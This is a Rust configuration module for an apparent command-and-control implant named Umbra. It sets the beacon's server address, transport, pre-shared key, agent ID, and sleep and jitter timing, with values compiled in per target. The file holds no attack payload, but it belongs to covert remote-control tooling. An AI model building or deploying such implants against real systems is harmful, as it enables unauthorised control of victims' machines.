//! Beacon configuration.
//!
//! Defaults are baked in at compile time from environment variables, which is
//! how implants are normally generated (one build per target):
//!
//!   UMBRA_SERVER=10.0.0.5:4001 UMBRA_PSK=<64 hex chars> cargo build --release
//!
//! The same variables can be overridden at runtime, which is handy for lab
//! testing without rebuilding.

use std::env;

pub const COMPILED_SERVER: &str = match option_env!("UMBRA_SERVER") {
    Some(v) => v,
    None => "127.0.0.1:4001",
};
pub const COMPILED_TRANSPORT: &str = match option_env!("UMBRA_TRANSPORT") {
    Some(v) => v,
    None => "tcp",
};
pub const COMPILED_HTTP_PATH: &str = match option_env!("UMBRA_HTTP_PATH") {
    Some(v) => v,
    None => "/api/v1/beacon",
};
pub const COMPILED_PSK: &str = match option_env!("UMBRA_PSK") {
    Some(v) => v,
    None => "",
};
pub const COMPILED_AGENT_ID: &str = match option_env!("UMBRA_AGENT_ID") {
    Some(v) => v,
    None => "",
};
pub const COMPILED_SLEEP: &str = match option_env!("UMBRA_SLEEP") {
    Some(v) => v,
    None => "5",
};
pub const COMPILED_JITTER: &str = match option_env!("UMBRA_JITTER") {
    Some(v) => v,
    None => "20",
};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Transport {
    Tcp,
    Http,
}

#[derive(Debug, Clone)]
pub struct Config {
    pub server: String,
    pub transport: Transport,
    pub http_path: String,
    pub agent_id: String,
    pub psk: Vec<u8>,
    pub sleep: u64,
    pub jitter: u32,
    pub verbose: bool,
}

fn pick(name: &str, compiled: &str) -> String {
    match env::var(name) {
        Ok(v) if !v.trim().is_empty() => v.trim().to_string(),
        _ => compiled.to_string(),
    }
}

pub fn hex_decode(s: &str) -> Option<Vec<u8>> {
    let s = s.trim();
    if s.len() % 2 != 0 {
        return None;
    }
    let mut out = Vec::with_capacity(s.len() / 2);
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let hi = (bytes[i] as char).to_digit(16)?;
        let lo = (bytes[i + 1] as char).to_digit(16)?;
        out.push(((hi << 4) | lo) as u8);
        i += 2;
    }
    Some(out)
}

pub fn hex_encode(b: &[u8]) -> String {
    let mut s = String::with_capacity(b.len() * 2);
    for byte in b {
        s.push_str(&format!("{byte:02x}"));
    }
    s
}

impl Config {
    /// Load configuration from env (falling back to the compiled defaults).
    pub fn load() -> Result<Config, String> {
        let transport_raw = pick("UMBRA_TRANSPORT", COMPILED_TRANSPORT).to_ascii_lowercase();
        let transport = match transport_raw.as_str() {
            "tcp" => Transport::Tcp,
            "http" | "https" => Transport::Http,
            other => return Err(format!("unknown transport {other:?} (tcp|http)")),
        };

        let psk_raw = pick("UMBRA_PSK", COMPILED_PSK);
        if psk_raw.is_empty() {
            return Err(
                "no PSK: set UMBRA_PSK to the hex key from `umbra-server -gen-psk`".to_string(),
            );
        }
        let psk = hex_decode(&psk_raw).ok_or_else(|| "UMBRA_PSK must be hex".to_string())?;
        if psk.len() < 16 {
            return Err("UMBRA_PSK must decode to at least 16 bytes".to_string());
        }

        let mut agent_id = pick("UMBRA_AGENT_ID", COMPILED_AGENT_ID);
        if agent_id.is_empty() {
            agent_id = format!("agent-{}", crate::config::hex_encode(&crate::crypto::random_bytes(4)));
        }

        let sleep = pick("UMBRA_SLEEP", COMPILED_SLEEP)
            .parse::<u64>()
            .map_err(|_| "UMBRA_SLEEP must be an integer".to_string())?;
        if sleep == 0 {
            return Err("UMBRA_SLEEP must be >= 1".to_string());
        }
        let jitter = pick("UMBRA_JITTER", COMPILED_JITTER)
            .parse::<u32>()
            .map_err(|_| "UMBRA_JITTER must be an integer".to_string())?;
        if jitter > 90 {
            return Err("UMBRA_JITTER must be <= 90".to_string());
        }

        Ok(Config {
            server: pick("UMBRA_SERVER", COMPILED_SERVER),
            transport,
            http_path: pick("UMBRA_HTTP_PATH", COMPILED_HTTP_PATH),
            agent_id,
            psk,
            sleep,
            jitter,
            verbose: env::var("UMBRA_VERBOSE").map(|v| v == "1").unwrap_or(false),
        })
    }
}
